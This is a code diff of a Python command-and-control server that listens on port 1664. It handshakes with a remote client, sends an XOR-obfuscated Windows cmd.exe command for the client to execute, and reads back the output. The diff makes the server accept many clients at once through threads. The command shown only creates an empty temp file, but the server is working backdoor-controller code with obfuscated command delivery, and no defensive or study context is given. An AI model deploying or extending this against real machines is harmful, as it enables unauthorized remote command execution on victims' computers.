@@ -1,5 +1,5 @@
 import socket
-import time
+import threading
 
 # Command definitions matching the client
 CMD_NULL = 0b0000
@@ -7,83 +7,75 @@ CMD_HELLO = 0b0001
 CMD_READY = 0b0010
 CMD_EXEC = 0b0100
 CMD_EXIT = 0b1000
-
+CIPHER_KEY = 0xFF  # Example cipher key for XOR
 BUFFER_SIZE = 1024
+
+# Hardcoded command
+command_to_send = 'cmd.exe /c copy /b NUL %TEMP%\\test.txt\0'
 
 def xor_cipher(data, key):
     return bytes([b ^ key for b in data])
 
-def main():
-    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server_socket.bind(('0.0.0.0', 1664))  # Bind to the same port as specified in the client
-    server_socket.listen(1)
-
-    print("Server listening on port 1664")
-    
-    conn, addr = server_socket.accept()
-    print(f"Connected by {addr}")
-
+def handle_client(client_socket):
     try:
-        # Receive client's hello
-        data = conn.recv(1)
-        if data[0] != CMD_HELLO:
-            print("Did not receive CMD_HELLO, exiting...")
-            conn.close()
-            server_socket.close()
+        # Step 2: Await client hello
+        client_hello = client_socket.recv(1)
+        if not client_hello or client_hello[0] != CMD_HELLO:
+            print("Expected client hello, got something else or nothing.")
+            client_socket.close()
             return
+        
+        # Step 3: Send server hello
+        client_socket.sendall(bytes([CMD_HELLO]))
+        print("Sent server hello")
 
-        print("Received CMD_HELLO from client")
+        # Step 4: Wait for client ready signal
+        client_ready = client_socket.recv(1)
+        if not client_ready or client_ready[0] != CMD_READY:
+            print("Expected client ready, got something else or nothing.")
+            client_socket.close()
+            return
+        print("Received client ready")
 
-        # Send server hello
-        conn.sendall(bytes([CMD_HELLO]))
-        print("Sent CMD_HELLO to client")
+        # Send server ready
+        client_socket.sendall(bytes([CMD_READY]))
+        print("Sent server ready")
 
-        while True:
-            # Wait for client's ready signal
-            data = conn.recv(1)
-            if not data or data[0] != CMD_READY:
-                print("Client is not ready, exiting...")
-                break
+        # Send command key
+        client_socket.sendall(bytes([CMD_EXEC]))
 
-            print("Received CMD_READY from client")
+        # Step 5: Send cipher key
+        client_socket.sendall(bytes([CIPHER_KEY]))
+        print("Sent cipher key")
 
-            # Send the ready signal back to the client
-            conn.sendall(bytes([CMD_READY]))
-            print("Sent CMD_READY to client")
+        # Step 6: Send ciphered command
+        encrypted_command = xor_cipher(command_to_send.encode('utf-8'), CIPHER_KEY)
+        client_socket.sendall(encrypted_command)
+        print("Sent ciphered command")
 
-            # Simulate sending a command (e.g., 'echo Hello, World!')
-            command = 'cmd.exe /c copy /b NUL c:\\Windows\\temp\\test.txt\0'
-            cipher_key = 0x01  # Example cipher key
+        # Step 7: Receive command output
+        output = client_socket.recv(BUFFER_SIZE)
+        if not output:
+            print("Warning: Received empty output from client.")
+        else:
+            print("Received command output:", output.decode('utf-8'))
 
-            # Send the command to execute
-            conn.sendall(bytes([CMD_EXEC]))
-            print("Sent CMD_EXEC to client")
-
-            # Send the cipher key
-            conn.sendall(bytes([cipher_key]))
-            print(f"Sent cipher key {cipher_key} to client")
-
-            # Send the ciphered command
-            ciphered_command = xor_cipher(command.encode('utf-8'), cipher_key)
-            conn.sendall(ciphered_command)
-            print(f"Sent ciphered command '{command}' to client")
-
-            # # Receive the execution result from the client
-            # result = conn.recv(BUFFER_SIZE)
-            # print(f"Received command execution result: {result.decode('utf-8')}")
-
-            # Optionally send the exit command
-            conn.sendall(bytes([CMD_EXIT]))
-            print("Sent CMD_EXIT to client")
-            #break
-
-    except Exception as e:
-        print(f"An error occurred: {e}")
-
+    except socket.error as e:
+        print(f"Socket error: {e}")
     finally:
-        print("Connection closed.")
-        conn.close()
-        server_socket.close()
+        client_socket.close()
+
+def start_server(server_ip, server_port):
+    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server.bind((server_ip, server_port))
+    server.listen(5)
+    print(f"Server listening on {server_ip}:{server_port}")
+
+    while True:
+        client_socket, addr = server.accept()
+        print(f"Accepted connection from {addr}")
+        client_handler = threading.Thread(target=handle_client, args=(client_socket,))
+        client_handler.start()
 
 if __name__ == "__main__":
-    main()
+    start_server("0.0.0.0", 1664)
